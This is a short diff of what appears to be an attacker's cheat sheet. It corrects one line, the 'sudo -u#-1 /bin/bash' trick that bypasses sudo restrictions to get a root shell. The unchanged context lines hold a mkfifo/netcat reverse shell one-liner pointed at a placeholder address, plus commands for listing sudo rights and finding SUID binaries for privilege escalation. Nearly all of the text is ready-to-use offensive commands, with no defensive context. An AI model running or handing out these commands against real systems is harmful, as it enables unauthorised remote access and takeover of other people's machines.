@@ -18,5 +18,5 @@
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDR] [PORT] >/tmp/f
 sudo -l   # /etc/sudoers
 find / -perm -4000 2>/dev/null    # file with suid
-Sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
 ```
